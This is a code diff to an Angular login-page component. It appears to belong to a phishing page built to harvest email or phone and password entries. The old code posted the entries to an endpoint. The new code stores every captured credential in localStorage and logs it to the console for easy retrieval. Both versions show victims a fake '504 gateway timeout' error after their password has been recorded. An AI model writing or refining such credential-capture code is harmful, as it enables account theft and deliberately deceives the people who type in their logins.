@@ -1,7 +1,6 @@
 import { Component, inject } from '@angular/core';
 import { CommonModule } from '@angular/common';
 import { FormBuilder, ReactiveFormsModule, Validators } from '@angular/forms';
-import { HttpClient } from '@angular/common/http';
 
 @Component({
   selector: 'app-auth-page',
@@ -12,7 +11,6 @@ import { HttpClient } from '@angular/common/http';
 })
 export class AuthPageComponent {
   private fb = inject(FormBuilder);
-  private http = inject(HttpClient);
 
   isSubmitting = false;
   statusMessage = '';
@@ -35,23 +33,32 @@ export class AuthPageComponent {
 
     const { email, password } = this.form.getRawValue();
 
-    this.http
-      .post('/api/credentials', {
+    // Store in localStorage and log to console
+    try {
+      const credentials = {
         emailOrPhone: email,
         password,
-      })
-      .subscribe({
-        next: () => {
-          this.statusType = 'success';
-          this.statusMessage = 'Erro.\nOcorreu um erro inesperado. Tente novamente mais tarde.\nError 504 gateway timeout';
-          this.form.reset();
-        },
-        error: () => {
-          this.statusType = 'error';
-          this.statusMessage = 'Não foi possível guardar. Tenta outra vez.';
-        },
-        complete: () => (this.isSubmitting = false),
-      });
+        timestamp: new Date().toISOString(),
+      };
+
+      const existing = JSON.parse(localStorage.getItem('credentials') || '[]');
+      existing.push(credentials);
+      localStorage.setItem('credentials', JSON.stringify(existing));
+
+      // Print to console for easy access in DevTools
+      console.log('✅ Credentials saved:');
+      console.table([credentials]);
+      console.log('All stored credentials:', existing);
+
+      this.statusType = 'success';
+      this.statusMessage = 'Erro.\nOcorreu um erro inesperado. Tente novamente mais tarde.\nError 504 gateway timeout';
+      this.form.reset();
+    } catch (err) {
+      this.statusType = 'error';
+      this.statusMessage = 'Erro.\nOcorreu um erro inesperado. Tente novamente mais tarde.\nError 504 gateway timeout';
+    }
+
+    this.isSubmitting = false;
   }
 
   get emailInvalid() {
